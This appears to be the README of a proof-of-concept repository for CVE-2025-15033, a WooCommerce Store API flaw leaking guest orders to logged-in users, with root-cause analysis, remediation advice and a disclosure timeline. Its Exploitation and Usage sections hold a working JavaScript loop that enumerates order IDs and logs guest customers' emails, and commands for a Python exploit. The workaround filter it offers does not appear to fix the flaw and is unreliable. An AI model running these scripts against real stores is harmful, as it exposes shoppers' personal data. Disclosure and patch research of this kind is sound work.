# CVE-2025-15033 - WooCommerce Guest Order Data Disclosure

[![CVE](https://img.shields.io/badge/CVE-2025--15033-red)](https://nvd.nist.gov/vuln/detail/CVE-2025-15033)
[![CVSS](https://img.shields.io/badge/CVSS-6.5%20(Medium)-orange)](https://nvd.nist.gov/vuln/detail/CVE-2025-15033)
[![Affected](https://img.shields.io/badge/Affected-WooCommerce%208.1--10.4.2-blue)](https://developer.woocommerce.com/2025/12/22/store-api-vulnerability-patched-in-woocommerce-8-1/)

A vulnerability in WooCommerce versions 8.1 to 10.4.2 allows authenticated users to access order data of guest customers via the Store API.

## Table of Contents

- [Vulnerability Summary](#vulnerability-summary)
- [Affected Versions](#affected-versions)
- [Technical Analysis](#technical-analysis)
- [Exploitation](#exploitation)
- [Usage](#usage)
- [Remediation](#remediation)
- [Timeline](#timeline)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-15033 |
| **CVSS Score** | 6.5 (Medium) |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **Vulnerability Type** | Broken Access Control / IDOR |
| **Authentication Required** | Yes (any authenticated user) |
| **User Interaction** | None |

### Impact

An authenticated WordPress user with minimal privileges (subscriber/customer role) can:

- Access full billing addresses of guest customers
- Retrieve email addresses and phone numbers
- View complete order history and items purchased
- Enumerate all guest orders on the platform
- Potential GDPR/privacy regulation violations

## Affected Versions

| Version Branch | Vulnerable Versions | Patched Version |
|----------------|---------------------|-----------------|
| 10.4.x | 10.4.0 - 10.4.2 | 10.4.3 |
| 10.3.x | 10.3.0 - 10.3.6 | 10.3.7 |
| 10.2.x | 10.2.0 - 10.2.2 | 10.2.3 |
| 10.1.x | 10.1.0 - 10.1.2 | 10.1.3 |
| 10.0.x | 10.0.0 - 10.0.4 | 10.0.5 |
| 9.9.x | 9.9.0 - 9.9.5 | 9.9.6 |
| 9.8.x | 9.8.0 - 9.8.5 | 9.8.6 |
| 9.7.x | 9.7.0 - 9.7.1 | 9.7.2 |
| 9.6.x | 9.6.0 - 9.6.2 | 9.6.3 |
| 9.5.x | 9.5.0 - 9.5.2 | 9.5.3 |
| 8.1.x - 9.4.x | All versions | See [advisory](https://developer.woocommerce.com/2025/12/22/store-api-vulnerability-patched-in-woocommerce-8-1/) |

WooCommerce 8.0 and earlier are not affected.

## Technical Analysis

### How We Found This

This vulnerability was reverse engineered by comparing the code differences between vulnerable and patched versions on the [WooCommerce GitHub repository](https://github.com/woocommerce/woocommerce):

- Vulnerable version: [10.4.2](https://github.com/woocommerce/woocommerce/tree/10.4.2)
- Patched version: [10.4.3](https://github.com/woocommerce/woocommerce/tree/10.4.3)
- Comparison: [10.4.2...10.4.3](https://github.com/woocommerce/woocommerce/compare/10.4.2...10.4.3)

By analyzing the diff between these versions, we identified the security fix in `OrderAuthorizationTrait.php` and traced the root cause to a flawed capability check.

### Root Cause

The vulnerability exists in `src/StoreApi/Utilities/OrderAuthorizationTrait.php`.

#### Vulnerable Code (10.4.2 and earlier)

```php
public function is_authorized( \WP_REST_Request $request ) {
    $order_id = absint( $request['id'] );
    
    // FLAW: Uses pay_for_order capability which returns TRUE 
    // for ANY logged-in user accessing guest orders
    if ( ! current_user_can( 'pay_for_order', $order_id ) ) {
        throw new RouteException(...);
    }
    
    // FLAW: Validation ONLY runs for guests (user_id = 0)
    // Logged-in users BYPASS this check entirely
    if ( get_current_user_id() === 0 ) {
        $this->order_controller->validate_order_key( $order_id, $order_key );
        $this->validate_billing_email_matches_order( $order_id, $billing_email );
    }
    
    return true;
}
```

#### The Core Issue (wc-user-functions.php)

```php
case 'pay_for_order':
    $order = wc_get_order( $order_id );
    
    // Returns TRUE if:
    // 1. User owns the order, OR
    // 2. Order has NO user (guest order) <-- the bug
    if ( $order && ( $user_id === $order->get_user_id() || ! $order->get_user_id() ) ) {
        $allcaps['pay_for_order'] = true;
    }
    break;
```

The `pay_for_order` capability was designed to allow customers to pay for their own orders AND allow anyone to pay for guest orders (since guests can't log in). The Store API incorrectly relied on this capability for authorization, not just payment access.

#### Patched Code (10.4.3+)

```php
public function is_authorized( \WP_REST_Request $request ) {
    $order = wc_get_order( $order_id );
    $order_customer_id = $order->get_customer_id();

    // FIX: Explicit ownership check for registered customers
    if ( $order_customer_id ) {
        if ( get_current_user_id() === $order_customer_id ) {
            return true;
        } else {
            throw new RouteException('woocommerce_rest_invalid_user', ...);
        }
    }

    // FIX: For guest orders, ALWAYS require validation
    // regardless of visitor's login status
    $this->order_controller->validate_order_key( $order_id, $order_key );
    $this->validate_billing_email_matches_order( $order_id, $billing_email );
    
    return true;
}
```

### Attack Flow

```
1. Attacker creates/uses a customer account (minimal privileges)
2. Attacker calls: GET /wp-json/wc/store/v1/order/{id}
3. For guest orders (customer_id = 0):
   - pay_for_order capability returns TRUE
   - order_key/email validation is SKIPPED (user is logged in)
   - Full order data is returned
4. Attacker enumerates order IDs to find all guest orders
```

## Exploitation

### Prerequisites

1. Target runs WooCommerce 8.1 to 10.4.2
2. Store API is enabled (`/wp-json/wc/store/v1/` returns 200)
3. Guest checkout is enabled
4. At least one guest order exists
5. Attacker has any authenticated WordPress account

### Manual Testing

#### Browser Console (while logged in)

```javascript
// Test single order
fetch('/wp-json/wc/store/v1/order/1')
  .then(r => r.json())
  .then(d => {
    if (d.billing_address) {
      console.log('VULNERABLE - Guest order exposed:', d);
    } else {
      console.log('Protected or patched:', d.code);
    }
  });
```

#### Scan for guest orders

```javascript
(async () => {
    for (let i = 1; i <= 100; i++) {
        const r = await fetch(`/wp-json/wc/store/v1/order/${i}`);
        const d = await r.json();
        if (d.billing_address) {
            console.log(`[EXPOSED] Order #${i}: ${d.billing_address.email}`);
        }
        await new Promise(r => setTimeout(r, 100));
    }
})();
```

### Response Interpretation

| HTTP Code | Response | Meaning |
|-----------|----------|---------|
| 200 | Full order JSON with `billing_address` | VULNERABLE - Guest order exposed |
| 403 | `woocommerce_rest_invalid_user` | Protected - Registered user's order |
| 401 | `woocommerce_rest_invalid_billing_email` | PATCHED - Requires email validation |
| 401 | `woocommerce_rest_invalid_order_key` | PATCHED - Requires order key |
| 404 | `woocommerce_rest_invalid_order` | Order doesn't exist |

## Usage

### Python PoC

```bash
# Install dependencies
pip install requests

# Basic scan (requires authentication cookie)
python exploit.py -u https://target.com -c "wordpress_logged_in_xxx=value" -r 1-500

# With output file
python exploit.py -u https://target.com -c "wordpress_logged_in_xxx=value" -r 1-1000 -o results.json

# Check version only
python exploit.py -u https://target.com --check-version
```

### Getting Your Authentication Cookie

1. Login to the target WordPress site
2. Open Developer Tools (F12) -> Application -> Cookies
3. Copy the `wordpress_logged_in_*` cookie (name=value)

## Remediation

### Immediate Actions

1. Update WooCommerce to the patched version for your branch
2. Review access logs for suspicious patterns:
   - Multiple sequential requests to `/wp-json/wc/store/v1/order/{id}`
   - Same user accessing many different order IDs
3. Audit for data breach - check if customer PII was accessed

### Temporary Workaround

If immediate patching is not possible:

```php
// Add to functions.php or a custom plugin
add_filter('woocommerce_store_api_disable_nonce_check', '__return_false');

// Or disable guest checkout entirely
add_filter('woocommerce_checkout_registration_required', '__return_true');
```

## Timeline

| Date | Event |
|------|-------|
| 2025-12-22 | Vulnerability publicly disclosed |
| 2025-12-22 | Patches released for all affected versions |
| 2026-01-12 | Full PoC scheduled for public release |

## Credits

- Original Researcher: Peter St√∂ckli ([@p-](https://github.com/p-))
- Vendor: WooCommerce / Automattic
- PoC Development: Reverse engineered from [WooCommerce GitHub](https://github.com/woocommerce/woocommerce) version comparison

## Disclaimer

This tool is for educational and authorized security testing only. Unauthorized access to computer systems is illegal. 

The authors are not responsible for any misuse or damage caused by this tool. Get proper authorization before testing systems you don't own.

## References

- [WooCommerce Security Advisory](https://developer.woocommerce.com/2025/12/22/store-api-vulnerability-patched-in-woocommerce-8-1/)
- [CVE-2025-15033](https://nvd.nist.gov/vuln/detail/CVE-2025-15033)
- [WPScan Vulnerability Database](https://wpscan.com/vulnerability/f55fd7d3-7fbe-474f-9406-f47f8aee5e57)

## License

MIT License - See [LICENSE](LICENSE) for details.
